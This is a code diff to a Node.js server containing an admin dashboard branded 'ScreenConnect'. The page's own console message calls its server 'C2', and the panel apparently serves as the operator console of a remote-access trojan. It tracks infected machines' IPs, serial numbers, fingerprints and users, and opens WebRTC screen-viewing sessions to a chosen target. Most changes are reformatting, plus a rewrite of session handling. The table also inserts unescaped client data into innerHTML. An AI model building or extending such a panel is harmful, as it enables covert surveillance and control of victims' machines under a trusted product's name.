@@ -4,7 +4,7 @@ const { v4: uuidv4 } = require('uuid');
 const { createClient } = require('@libsql/client');
 const fs = require('fs');
 const os = require('os');
-   
+ 
 // =====================================================
 // TURSO DATABASE SETUP - VERCEL OPTIMIZED
 // UPDATED SCHEMA WITH FINGERPRINT
@@ -1143,8 +1143,15 @@ const adminHTML = `
  font-weight: 700;
  }
 
- .stat-card .value.online { color: var(--success); text-shadow: 0 0 12px var(--success-glow); }
- .stat-card .value.accent { color: var(--accent); text-shadow: 0 0 12px var(--accent-glow); }
+ .stat-card .value.online {
+ color: var(--success);
+ text-shadow: 0 0 12px var(--success-glow);
+ }
+
+ .stat-card .value.accent {
+ color: var(--accent);
+ text-shadow: 0 0 12px var(--accent-glow);
+ }
 
  .data-panel {
  background-color: var(--bg-surface);
@@ -1259,7 +1266,10 @@ const adminHTML = `
 
  .modal-overlay {
  position: fixed;
- top: 0; left: 0; width: 100vw; height: 100vh;
+ top: 0;
+ left: 0;
+ width: 100vw;
+ height: 100vh;
  background: rgba(0, 0, 0, 0.8);
  backdrop-filter: blur(8px);
  display: flex;
@@ -1313,7 +1323,8 @@ const adminHTML = `
  }
 
  .session-title .dot {
- width: 8px; height: 8px;
+ width: 8px;
+ height: 8px;
  background: var(--success);
  border-radius: 50%;
  box-shadow: 0 0 8px var(--success);
@@ -1335,7 +1346,8 @@ const adminHTML = `
  background: rgba(255,255,255,0.05);
  border: 1px solid var(--border-light);
  color: var(--text-main);
- width: 32px; height: 32px;
+ width: 32px;
+ height: 32px;
  border-radius: 6px;
  display: flex;
  justify-content: center;
@@ -1371,8 +1383,7 @@ const adminHTML = `
  align-items: center;
  position: relative;
  overflow: hidden;
- background-image:
- radial-gradient(circle at center, #1e293b 0%, #020617 100%);
+ background-image: radial-gradient(circle at center, #1e293b 0%, #020617 100%);
  }
 
  .connecting-state {
@@ -1401,19 +1412,28 @@ const adminHTML = `
  font-size: 0.9rem;
  }
 
- ::-webkit-scrollbar { width: 8px; }
- ::-webkit-scrollbar-track { background: var(--bg-base); }
- ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
- ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+ ::-webkit-scrollbar {
+ width: 8px;
+ }
+
+ ::-webkit-scrollbar-track {
+ background: var(--bg-base);
+ }
+
+ ::-webkit-scrollbar-thumb {
+ background: var(--border);
+ border-radius: 4px;
+ }
+
+ ::-webkit-scrollbar-thumb:hover {
+ background: var(--text-muted);
+ }
  </style>
 </head>
 <body>
-
  <!-- Sidebar -->
  <aside class="sidebar">
- <div class="logo-area">
- <i class="fa-solid fa-layer-group"></i> ScreenConnect
- </div>
+ <div class="logo-area"><i class="fa-solid fa-layer-group"></i> ScreenConnect</div>
  <div class="nav-menu">
  <a href="#" class="nav-item active"><i class="fa-solid fa-desktop"></i> Machines</a>
  <a href="#" class="nav-item"><i class="fa-solid fa-users"></i> Users</a>
@@ -1421,62 +1441,31 @@ const adminHTML = `
  <a href="#" class="nav-item"><i class="fa-solid fa-chart-pie"></i> Analytics</a>
  <a href="#" class="nav-item"><i class="fa-solid fa-gear"></i> Settings</a>
  </div>
- <div class="build-btn-container">
- <button class="build-btn" onclick="openNewSession()">
- <i class="fa-solid fa-plus"></i> New Session
- </button>
- </div>
+ <div class="build-btn-container"><button class="build-btn" onclick="openNewSession()"><i class="fa-solid fa-plus"></i> New Session</button></div>
  </aside>
 
  <!-- Main Content -->
  <main class="main-content">
-
- <!-- Header -->
  <header class="top-header">
- <div class="search-bar">
- <i class="fa-solid fa-magnifying-glass"></i>
- <input type="text" placeholder="Search connected machines..." id="searchInput" onkeyup="filterTable()">
- </div>
+ <div class="search-bar"><i class="fa-solid fa-magnifying-glass"></i><input type="text" placeholder="Search connected machines..." id="searchInput" onkeyup="filterTable()"></div>
  <div class="header-actions">
  <i class="fa-regular fa-bell"></i>
  <i class="fa-regular fa-circle-question"></i>
- <div style="width: 32px; height: 32px; border-radius: 50%; background: var(--accent); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.8rem; cursor: pointer;">
- JD
- </div>
+ <div style="width: 32px; height: 32px; border-radius: 50%; background: var(--accent); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.8rem; cursor: pointer;">JD</div>
  </div>
  </header>
 
- <!-- Dashboard Body -->
  <div class="content-body">
  <h1 class="page-title">Guest Connected</h1>
-
- <!-- Stats Row -->
  <div class="stats-grid">
- <div class="stat-card">
- <span class="title">Total Users</span>
- <span class="value" id="totalUsers">0</span>
- </div>
- <div class="stat-card">
- <span class="title">Currently Online</span>
- <span class="value online" id="onlineUsers">0</span>
- </div>
- <div class="stat-card">
- <span class="title">Offline</span>
- <span class="value" id="offlineUsers">0</span>
- </div>
- <div class="stat-card">
- <span class="title">Active Sessions</span>
- <span class="value accent" id="activeSessions">0</span>
- </div>
+ <div class="stat-card"><span class="title">Total Users</span><span class="value" id="totalUsers">0</span></div>
+ <div class="stat-card"><span class="title">Currently Online</span><span class="value online" id="onlineUsers">0</span></div>
+ <div class="stat-card"><span class="title">Offline</span><span class="value" id="offlineUsers">0</span></div>
+ <div class="stat-card"><span class="title">Active Sessions</span><span class="value accent" id="activeSessions">0</span></div>
  </div>
 
- <!-- Data Table -->
  <div class="data-panel">
- <div class="panel-header">
- <span>Computer Directory</span>
- <i class="fa-solid fa-filter" style="cursor: pointer; color: var(--text-muted);"></i>
- </div>
-
+ <div class="panel-header"><span>Computer Directory</span><i class="fa-solid fa-filter" style="cursor: pointer; color: var(--text-muted);"></i></div>
  <div class="table-header">
  <div></div>
  <div>Computer Name</div>
@@ -1485,10 +1474,7 @@ const adminHTML = `
  <div>Last Seen</div>
  <div>Status</div>
  </div>
-
- <div id="table-body">
- <!-- Rows will be populated by JS -->
- </div>
+ <div id="table-body"></div>
  </div>
  </div>
  </main>
@@ -1496,36 +1482,23 @@ const adminHTML = `
  <!-- REMOTE SESSION MODAL -->
  <div class="modal-overlay" id="sessionModal" onclick="closeSession(event)">
  <div class="session-container" onclick="event.stopPropagation()">
-
- <!-- Modal Toolbar -->
  <div class="session-toolbar">
- <div class="session-title">
- <div class="dot"></div>
- <span id="modalMachineName">Connecting...</span>
- </div>
+ <div class="session-title"><div class="dot"></div><span id="modalMachineName">Connecting...</span></div>
  <div class="session-actions">
  <button class="tool-btn" title="Full Screen"><i class="fa-solid fa-expand"></i></button>
  <button class="tool-btn" title="Send Keys"><i class="fa-solid fa-keyboard"></i></button>
  <button class="tool-btn" title="Screenshot"><i class="fa-solid fa-camera"></i></button>
- <button class="tool-btn end-session" onclick="closeSession(event)">
- <i class="fa-solid fa-power-off"></i> End Session
- </button>
+ <button class="tool-btn end-session" onclick="closeSession(event)"><i class="fa-solid fa-power-off"></i> End Session</button>
  </div>
  </div>
-
- <!-- Modal Video Screen -->
  <div class="video-screen">
- <!-- Connecting State -->
  <div class="connecting-state" id="connectingState">
  <i class="fa-solid fa-circle-notch"></i>
  <h2>Establishing Secure Connection</h2>
  <p>Handshaking with remote machine...</p>
  </div>
-
- <!-- Actual Remote Desktop Video -->
  <video id="remoteVideo" autoplay playsinline style="width: 100%; height: 100%; object-fit: contain;"></video>
  </div>
-
  </div>
  </div>
 
@@ -1534,24 +1507,17 @@ const adminHTML = `
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  const host = window.location.host;
  const wsUrl = protocol + '//' + host + '/';
-
  const ws = new WebSocket(wsUrl);
  let users = {};
  let sessions = {};
  const remoteVideo = document.getElementById('remoteVideo');
 
- ws.onopen = () => {
- console.log("Admin connected to C2");
- ws.send(JSON.stringify({ type: 'register_admin' }));
- };
+ ws.onopen = () => { console.log("Admin connected to C2"); ws.send(JSON.stringify({ type: 'register_admin' })); };
 
  ws.onmessage = (event) => {
  try {
  const data = JSON.parse(event.data);
-
- if (data.type === 'registered') {
- ws.isAdmin = true;
- }
+ if (data.type === 'registered') { ws.isAdmin = true; }
  else if (data.type === 'init_users') {
  users = {};
  data.users.forEach(user => {
@@ -1569,15 +1535,7 @@ const adminHTML = `
  }
  else if (data.type === 'user_update') {
  if (!users[data.id]) {
- users[data.id] = {
- status: 'Online',
- info: data.info,
- lastSeen: data.lastSeen,
- sessionActive: false,
- serialNumber: data.info.serialNumber || 'N/A',
- ip: data.info.ip || 'Unknown',
- fingerprint: data.info.fingerprint || 'N/A'
- };
+ users[data.id] = { status: 'Online', info: data.info, lastSeen: data.lastSeen, sessionActive: false, serialNumber: data.info.serialNumber || 'N/A', ip: data.info.ip || 'Unknown', fingerprint: data.info.fingerprint || 'N/A' };
  } else {
  users[data.id].status = 'Online';
  users[data.id].info = data.info;
@@ -1587,65 +1545,23 @@ const adminHTML = `
  renderUsers();
  }
  else if (data.type === 'heartbeat') {
- if (users[data.id]) {
- users[data.id].lastSeen = Date.now();
- users[data.id].status = 'Online';
- renderUsers();
+ if (users[data.id]) { users[data.id].lastSeen = Date.now(); users[data.id].status = 'Online'; renderUsers(); }
  }
- }
- else if (data.type === 'offer') {
- handleWebRTCOffer(data.sdp, data.targetId);
- }
- else if (data.type === 'candidate') {
- handleWebRTCCandidate(data.candidate, data.targetId);
- }
+ else if (data.type === 'offer') { handleWebRTCOffer(data.sdp, data.targetId); }
+ else if (data.type === 'candidate') { handleWebRTCCandidate(data.candidate, data.targetId); }
  else if (data.type === 'session_active') {
- if (users[data.agentId]) {
- users[data.agentId].sessionActive = true;
- users[data.agentId].status = 'Online';
- renderUsers();
+ if (users[data.agentId]) { users[data.agentId].sessionActive = true; users[data.agentId].status = 'Online'; renderUsers(); }
  }
- }
- else if (data.type === 'refresh_users') {
- // Refresh logic handled by real-time updates
- }
- } catch (e) {
- console.error("Error parsing message:", e);
- }
+ } catch (e) { console.error("Error parsing message:", e); }
  };
 
  function getSession(targetId) {
  if (!sessions[targetId]) {
- sessions[targetId] = {
- pc: new RTCPeerConnection({
- iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
- }),
- candidates: []
- };
-
+ sessions[targetId] = { pc: new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }), candidates: [] };
  const pc = sessions[targetId].pc;
-
- pc.ontrack = (event) => {
- remoteVideo.srcObject = event.streams[0];
- document.getElementById('connectingState').style.display = 'none';
- };
-
- pc.onicecandidate = (event) => {
- if (event.candidate) {
- ws.send(JSON.stringify({
- type: 'candidate',
- targetId: targetId,
- candidate: event.candidate
- }));
- }
- };
-
- pc.oniceconnectionstatechange = () => {
- const state = pc.iceConnectionState;
- if (state === 'disconnected' || state === 'failed') {
- closeSession(null, true);
- }
- };
+ pc.ontrack = (event) => { remoteVideo.srcObject = event.streams[0]; document.getElementById('connectingState').style.display = 'none'; };
+ pc.onicecandidate = (event) => { if (event.candidate) ws.send(JSON.stringify({ type: 'candidate', targetId: targetId, candidate: event.candidate })); };
+ pc.oniceconnectionstatechange = () => { if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') closeSession(null, true); };
  }
  return sessions[targetId];
  }
@@ -1653,136 +1569,81 @@ const adminHTML = `
  async function handleWebRTCOffer(offerSDP, targetId) {
  const session = getSession(targetId);
  const pc = session.pc;
-
  try {
  await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));
-
- while (session.candidates.length > 0) {
- const candidate = session.candidates.shift();
- await pc.addIceCandidate(new RTCIceCandidate(candidate));
- }
-
+ while (session.candidates.length > 0) { const candidate = session.candidates.shift(); await pc.addIceCandidate(new RTCIceCandidate(candidate)); }
  const answer = await pc.createAnswer();
  await pc.setLocalDescription(answer);
-
- ws.send(JSON.stringify({
- type: 'answer',
- targetId: targetId,
- sdp: pc.localDescription
- }));
- } catch (err) {
- console.error("[WEBRTC] Error handling offer:", err);
- }
+ ws.send(JSON.stringify({ type: 'answer', targetId: targetId, sdp: pc.localDescription }));
+ } catch (err) { console.error("[WEBRTC] Error handling offer:", err); }
  }
 
  function handleWebRTCCandidate(candidate, targetId) {
  const session = getSession(targetId);
-
- if (session.pc.remoteDescription) {
- session.pc.addIceCandidate(new RTCIceCandidate(candidate))
- .catch(err => console.error("[WEBRTC] Error adding candidate:", err));
- } else {
- session.candidates.push(candidate);
- }
- }
-
- function closeSession(e, force = false) {
- if(e) e.preventDefault();
- document.getElementById('sessionModal').classList.remove('active');
- 
- Object.keys(sessions).forEach(sid => {
- if(sessions[sid].pc) sessions[sid].pc.close();
- delete sessions[sid];
- });
- remoteVideo.srcObject = null;
- document.getElementById('connectingState').style.display = 'block';
- }
-
- function renderUsers() {
- const grid = document.getElementById('table-body');
- grid.innerHTML = '';
- 
- let total = Object.keys(users).length;
- let online = 0;
- let offline = 0;
- let activeSessions = 0;
-
- for (const [id, data] of Object.entries(users)) {
- if (data.status === 'Online') {
- online++;
- if (data.sessionActive) activeSessions++;
- } else {
- offline++;
- }
- 
- const row = document.createElement('div');
- row.className = 'table-row';
- row.onclick = () => openSession(id);
- 
- const lastSeenStr = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'Never';
- 
- row.innerHTML = \`
- <div class="custom-checkbox"></div>
- <div class="machine-info">
- <div class="name"><i class="fa-solid fa-desktop"></i> \${id}</div>
- <div class="company">\${data.info.user || 'Unknown User'} | \${data.info.os || 'Unknown OS'}</div>
- </div>
- <div>\${data.serialNumber || 'N/A'}</div>
- <div>\${data.info.os || 'N/A'} / \${data.info.user || 'N/A'}</div>
- <div>\${lastSeenStr}</div>
- <div class="status">
- <div class="status-dot \${data.status === 'Online' ? 'online' : 'offline'}"></div>
- <span>\${data.status}</span>
- </div>
- \`;
- 
- grid.appendChild(row);
- }
-
- document.getElementById('totalUsers').textContent = total;
- document.getElementById('onlineUsers').textContent = online;
- document.getElementById('offlineUsers').textContent = offline;
- document.getElementById('activeSessions').textContent = activeSessions;
- }
-
- function filterTable() {
- const input = document.getElementById('searchInput').value.toLowerCase();
- const rows = document.querySelectorAll('.table-row');
- 
- rows.forEach(row => {
- const name = row.querySelector('.machine-info .name').textContent.toLowerCase();
- const user = row.querySelector('.machine-info .company').textContent.toLowerCase();
- 
- if (name.includes(input) || user.includes(input)) {
- row.style.display = '';
- } else {
- row.style.display = 'none';
- }
- });
- }
-
- function openSession(targetId) {
- document.getElementById('sessionModal').classList.add('active');
- document.getElementById('modalMachineName').textContent = "Connecting to " + targetId;
- 
- const session = getSession(targetId);
- const pc = session.pc;
-
- pc.createOffer()
- .then(offer => pc.setLocalDescription(offer))
- .then(() => {
- ws.send(JSON.stringify({
- type: 'offer',
- targetId: targetId,
- sdp: pc.localDescription
- }));
- })
- .catch(err => console.error("[WEBRTC] Error creating offer:", err));
+ if (session.pc.remoteDescription) { session.pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => console.error("[WEBRTC] Error adding candidate:", err)); }
+ else { session.candidates.push(candidate); }
  }
 
  function openNewSession() {
- alert("Select a machine from the list to start a session.");
+ const targetId = prompt("Enter Target ID:");
+ if (!targetId) return;
+ const session = getSession(targetId);
+ const pc = session.pc;
+ pc.createOffer().then(offer => pc.setLocalDescription(offer)).then(() => {
+ ws.send(JSON.stringify({ type: 'offer', targetId: targetId, sdp: pc.localDescription }));
+ }).catch(err => console.error("[WEBRTC] Error creating offer:", err));
+ document.getElementById('sessionModal').classList.add('active');
+ document.getElementById('modalMachineName').innerText = targetId;
+ document.getElementById('connectingState').style.display = 'block';
  }
+
+ function closeSession(event, force = false) {
+ if (force || (event && event.target.classList.contains('end-session'))) {
+ const targetId = document.getElementById('modalMachineName').innerText;
+ if (sessions[targetId]) { sessions[targetId].pc.close(); delete sessions[targetId]; }
+ document.getElementById('sessionModal').classList.remove('active');
+ document.getElementById('connectingState').style.display = 'block';
+ }
+ }
+
+ function renderUsers() {
+ const tbody = document.getElementById('table-body');
+ tbody.innerHTML = '';
+ let total = 0, online = 0, offline = 0, active = 0;
+ const search = document.getElementById('searchInput').value.toLowerCase();
+
+ Object.keys(users).forEach(id => {
+ const u = users[id];
+ total++;
+ if (u.status === 'Online') online++; else offline++;
+ if (u.sessionActive) active++;
+
+ if (id.toLowerCase().includes(search) || (u.info.os && u.info.os.toLowerCase().includes(search)) || (u.info.user && u.info.user.toLowerCase().includes(search))) {
+ const row = document.createElement('div');
+ row.className = 'table-row';
+ row.onclick = () => openNewSession();
+ row.innerHTML = \`
+ <div class="custom-checkbox"><i class="fa-regular fa-square"></i></div>
+ <div class="machine-info">
+ <div class="name"><i class="fa-solid fa-desktop"></i> \${id}</div>
+ <div class="company">\${u.ip || 'No IP'}</div>
+ </div>
+ <div>\${u.fingerprint || 'N/A'}</div>
+ <div>\${u.info.os || 'Unknown'} / \${u.info.user || 'Unknown'}</div>
+ <div>\${new Date(u.lastSeen).toLocaleTimeString()}</div>
+ <div class="status"><div class="status-dot \${u.status.toLowerCase()}"></div> \${u.status}</div>
+ \`;
+ tbody.appendChild(row);
+ }
+ });
+
+ document.getElementById('totalUsers').innerText = total;
+ document.getElementById('onlineUsers').innerText = online;
+ document.getElementById('offlineUsers').innerText = offline;
+ document.getElementById('activeSessions').innerText = active;
+ }
+
+ function filterTable() { renderUsers(); }
  </script>
 </body>
 </html>
